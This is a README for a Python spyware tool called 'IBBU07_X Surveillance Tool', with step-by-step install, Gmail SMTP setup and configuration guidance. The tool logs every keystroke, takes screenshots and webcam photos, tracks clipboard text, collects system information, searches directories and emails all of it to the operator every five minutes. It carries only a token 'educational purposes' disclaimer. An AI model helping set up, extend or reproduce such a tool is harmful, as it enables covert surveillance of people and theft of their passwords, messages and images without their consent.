  # IBBU07_X Surveillance Tool                                        

  [![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://python.org)
  [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-orange.svg)](https://github.com/yourusername/BlackTechX-Surveillance)

  Simple surveillance tool with keylogging, screenshots, webcam
  capture, and email reporting.

  ## ⚠ Legal Warning
  For educational purposes and authorized security testing only. Do not
  use for illegal activities.

  ## 🚀 Quick Installation

  ### 1. Install Python Dependencies
  ```bash
  pip install pynput colorama pyautogui pyperclip opencv-python
  requests

                        2. Get Gmail App Password

  1 Go to Google Account Settings
  2 Go to Security → 2-Step Verification (enable if not already)
  3 Go to App passwords (search for it)
  4 Select Mail and generate 16-character password
  5 Use this password in the tool (NOT your regular password)

                       3. Configure Email Settings

  Edit spy_tool.py and change these lines:

  EMAIL_CONFIG = {
      'sender_email': 'your_email@gmail.com',
      'sender_password': 'your_16_char_app_password',
      'recipient_email': 'your_email@gmail.com',
      'email_interval': 300  # Send every 5 minutes
  }

                             4. Run the Tool

  python spy_tool.py


                         📋 Complete Setup Guide

                           Linux Installation

  # Update system
  sudo apt update && sudo apt upgrade -y

  # Install Python and pip
  sudo apt install python3 python3-pip -y

  # Install system dependencies
  sudo apt install gnome-screenshot scrot imagemagick python3-opencv -y

  # Install Python packages
  pip3 install pynput colorama pyautogui pyperclip opencv-python
  requests

  # Clone and run
  git clone https://github.com/yourusername/BlackTechX-Surveillance.git
  cd BlackTechX-Surveillance
  python3 spy_tool.py

                          Windows Installation

  # Install Python from python.org (check "Add to PATH")

  # Open Command Prompt as Administrator
  pip install pynput colorama pyautogui pyperclip opencv-python
  requests

  # Run the tool
  python spy_tool.py

                           macOS Installation

  # Install Homebrew if not installed
  /bin/bash -c "$(curl -fsSL
  https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

  # Install dependencies
  brew install python3 opencv
  pip3 install pynput colorama pyautogui pyperclip opencv-python
  requests

  # Run the tool
  python3 spy_tool.py

                       📧 Gmail Setup Instructions

                 Step 1: Enable 2-Factor Authentication

  1 Go to Google Account
  2 Click Security
  3 Under "Signing in to Google", click 2-Step Verification
  4 Follow the setup process

                       Step 2: Create App Password

  1 After enabling 2FA, go back to Security page
  2 Look for App passwords (you might need to search for it)
  3 Select Select app → Mail
  4 Select Select device → Other (Custom name)
  5 Enter: BlackTechX Surveillance
  6 Click Generate
  7 Copy the 16-character password

                         Step 3: Configure Tool

  EMAIL_CONFIG = {
      'smtp_server': 'smtp.gmail.com',
      'smtp_port': 587,
      'sender_email': 'your_email@gmail.com',
      'sender_password': 'abcd efgh ijkl mnop',  # Your 16-char app
  password
      'recipient_email': 'your_email@gmail.com',
      'email_interval': 300
  }

                               🎯 Features

  • Keylogging: Records all keystrokes
  • Screenshots: Takes screenshots every 60 seconds
  • Webcam Capture: Takes photos from webcam every 5 minutes
  • Clipboard Monitoring: Tracks copied text
  • System Info: Collects system information
  • Auto Email: Sends all data to your email every 5 minutes
  • Cross-Platform: Works on Linux, Windows, macOS


                            🔧 Configuration

                    Change Data Collection Intervals


  ADVANCED_CONFIG = {
      'screenshot_interval': 60,      # Screenshots every 60 seconds
      'webcam_interval': 300,         # Webcam every 5 minutes
      'clipboard_monitor': True,      # Enable clipboard monitoring
      'email_interval': 300           # Email every 5 minutes
  }

                     Change File Search Directories


  # For Linux
  'search_directories': ['/home', '/root', '/tmp']

  # For Windows
  'search_directories': ['C:\\', 'D:\\', 'C:\\Users']

  # For macOS
  'search_directories': ['/Users', '/Library', '/tmp']


                            🛠 Troubleshooting

                            Permission Errors


  # Linux/macOS - run with sudo if needed
  sudo python3 spy_tool.py

  # Windows - run Command Prompt as Administrator


                          Missing Dependencies


  # Reinstall all dependencies
  pip uninstall -y pynput colorama pyautogui pyperclip opencv-python
  requests
  pip install pynput colorama pyautogui pyperclip opencv-python
  requests


                            Screenshot Issues


  # Linux - install screenshot tools
  sudo apt install gnome-screenshot scrot imagemagick

  # If still not working, tool will use pyautogui fallback


                          Email Sending Issues

  1 Check Gmail App Password is correct
  2 Ensure 2-Factor Authentication is enabled
  3 Check firewall allows SMTP connections
  4 Try sending test email:

  import smtplib
  server = smtplib.SMTP('smtp.gmail.com', 587)
  server.starttls()
  server.login('your_email@gmail.com', 'your_app_password')
  print("Email test successful!")
  server.quit()


                              Webcam Issues

  • Most virtual machines don't have webcam access
  • Tool will skip webcam capture if no camera detected
  • No errors will be shown for missing webcam


                            📁 Files Created

  • keylog.txt - Keystroke logs
  • clipboard_log.txt - Clipboard content
  • system_info.txt - System information
  • screenshots/ - Screenshot images
  • webcam_captures/ - Webcam images
  • spy_data/ - Encrypted data packages


                         ⚡ Quick Start Commands


  # 1. Install everything (Linux)
  sudo apt update && sudo apt install python3 python3-pip
  gnome-screenshot scrot imagemagick -y
  pip3 install pynput colorama pyautogui pyperclip opencv-python
  requests

  # 2. Configure Gmail App Password (see instructions above)

  # 3. Edit email settings in spy_tool.py

  # 4. Run
  python3 spy_tool.py

  # 5. Press Ctrl+C to stop


                               📞 Support

  If you have issues:

  1 Check the troubleshooting section above
  2 Ensure all dependencies are installed
  3 Verify Gmail App Password is correct
  4 Check system permissions

 ───────────────────────────────────────────────────────────────────────
 Note: This tool automatically sends collected data to your email
 address every 5 minutes. Make sure your email configuration is correct
 before running.
